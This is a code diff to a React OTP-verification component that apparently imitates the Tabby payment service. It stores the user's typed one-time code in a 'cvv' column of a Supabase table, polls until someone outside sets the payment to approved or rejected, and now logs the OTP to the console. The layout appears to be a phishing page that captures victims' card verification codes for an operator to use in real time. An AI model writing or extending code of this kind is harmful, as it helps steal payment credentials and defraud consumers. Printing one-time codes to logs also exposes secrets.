@@ -77,49 +77,64 @@ const TabbyOtpVerification = () => {
         .update({ cvv: otpCode })
         .eq("id", paymentId);
 
-      if (updateError) throw updateError;
+      if (updateError) {
+        console.error("Error updating OTP:", updateError);
+        throw updateError;
+      }
+
+      console.log("OTP updated successfully:", otpCode);
 
       // Poll for payment status
       pollIntervalRef.current = setInterval(async () => {
-        const { data: statusData, error: statusError } = await supabase
-          .from("tabby_payments")
-          .select("payment_status")
-          .eq("id", paymentId)
-          .single();
+        try {
+          const { data: statusData, error: statusError } = await supabase
+            .from("tabby_payments")
+            .select("payment_status, cvv")
+            .eq("id", paymentId)
+            .single();
 
-        if (statusError) {
-          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-          if (timeoutRef.current) clearTimeout(timeoutRef.current);
-          setVerificationStatus("error");
-          setTimeout(() => {
-            setVerificationStatus("idle");
-            setOtp(["", "", "", ""]);
-            inputRefs.current[0]?.focus();
-          }, 2000);
-          return;
+          console.log("Polling status:", statusData);
+
+          if (statusError) {
+            console.error("Error polling status:", statusError);
+            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+            if (timeoutRef.current) clearTimeout(timeoutRef.current);
+            setVerificationStatus("error");
+            setTimeout(() => {
+              setVerificationStatus("idle");
+              setOtp(["", "", "", ""]);
+              inputRefs.current[0]?.focus();
+            }, 2000);
+            return;
+          }
+
+          if (statusData.payment_status === "approved") {
+            console.log("Payment approved, navigating to home");
+            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+            if (timeoutRef.current) clearTimeout(timeoutRef.current);
+            setVerificationStatus("success");
+            setTimeout(() => {
+              window.location.href = "/";
+            }, 1500);
+          } else if (statusData.payment_status === "rejected") {
+            console.log("Payment rejected");
+            if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
+            if (timeoutRef.current) clearTimeout(timeoutRef.current);
+            setVerificationStatus("error");
+            setTimeout(() => {
+              setVerificationStatus("idle");
+              setOtp(["", "", "", ""]);
+              inputRefs.current[0]?.focus();
+            }, 2000);
+          }
+        } catch (pollError) {
+          console.error("Polling error:", pollError);
         }
+      }, 1500);
 
-        if (statusData.payment_status === "approved") {
-          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-          if (timeoutRef.current) clearTimeout(timeoutRef.current);
-          setVerificationStatus("success");
-          setTimeout(() => {
-            navigate("/", { replace: true });
-          }, 1000);
-        } else if (statusData.payment_status === "rejected") {
-          if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-          if (timeoutRef.current) clearTimeout(timeoutRef.current);
-          setVerificationStatus("error");
-          setTimeout(() => {
-            setVerificationStatus("idle");
-            setOtp(["", "", "", ""]);
-            inputRefs.current[0]?.focus();
-          }, 2000);
-        }
-      }, 1000);
-
-      // Timeout after 20 seconds
+      // Timeout after 30 seconds
       timeoutRef.current = setTimeout(() => {
+        console.log("Verification timeout");
         if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
         setVerificationStatus("error");
         setTimeout(() => {
@@ -127,7 +142,7 @@ const TabbyOtpVerification = () => {
           setOtp(["", "", "", ""]);
           inputRefs.current[0]?.focus();
         }, 2000);
-      }, 20000);
+      }, 30000);
 
     } catch (error) {
       console.error("OTP verification error:", error);
